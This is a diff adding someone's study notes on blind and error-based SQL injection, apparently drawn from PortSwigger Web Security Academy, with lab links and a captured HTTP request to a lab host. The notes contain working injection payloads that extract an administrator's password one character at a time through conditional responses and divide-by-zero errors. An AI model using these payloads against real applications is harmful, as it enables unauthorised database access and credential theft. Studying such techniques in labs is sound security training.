@@ -248,4 +248,101 @@ We can continue this process to systematically determine the full password for t
 The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 
-# Blind SQLi Read in future
+## What is blind SQL injection?
+- when application not return result ->just result A process executed on data Like whether the product is available or not.
+- we can't exploiting with `UNION`
+Exploiting blind SQL injection by triggering conditional responses
+Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
+`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+```sql
+`…xyz' AND '1'='1 
+…xyz' AND '1'='2`
+```
+- we two request
+- request one because  a true conditional web application return `welcome back`
+- but request two not a true conditional web app not return `welcome back`
+- You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+- `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+- You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+```sql
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+```
+- **What This Does**
+- This extracts the **first character** of the password for the `Administrator` user -> m
+
+ - character 2 finding
+ ```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) > 'a
+```
+
+> [!note] note
+> The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
+- #### Practice in [lab](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
+- ![[p-blind1-1.png]]
+```http
+GET /login HTTP/2
+Host: 0a4600130431e87880388612001700b1.web-security-academy.net
+Cookie: TrackingId=QWPRSTUGGGBjEqaj; session=EtKXcSR8E04dpneBCqXhAwlG4Mx1Y5x7
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a4600130431e87880388612001700b1.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+- we inject in point `Cookie: TrackingId=QWPRSTUGGGBjEqaj; session=EtKXcSR8E04dpneBCqXhAwlG4Mx1Y5x7`
+- #### detection
+- ![[p-blind1-2.png]]
+- ![[p-blind1-3.png]]
+- when conditional true return `welcome back` ..
+- we inject this payload
+```sql
+AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm`
+```
+- ![[p-blind1-4.png]]
+- because return `welcome back` --> first character of password --> administrator
+- go search second character of password
+- ![[p-blind1-5.png]]
+- not return welcome back because  `p` no second character ...
+- We continue like this until the end of the password.
+- How Automating
+- write  a code or use Burp suite --> INturder
+
+
+## Error-based SQL injection
+
+Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+
+- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
+- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.
+- ## Exploiting blind SQL injection by triggering conditional errors - Continued
+
+To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
+
+`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
+
+These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
+
+- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
+- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
+
+If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
+
+Using this technique, you can retrieve data by testing one character at a time:
+
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+> [!note] note
+>There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.
+### Practice in [lab](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
+- this is hard for me now .  I help community solution [Youtube](https://www.youtube.com/watch?v=_7w-KEP_K5w)
+- 
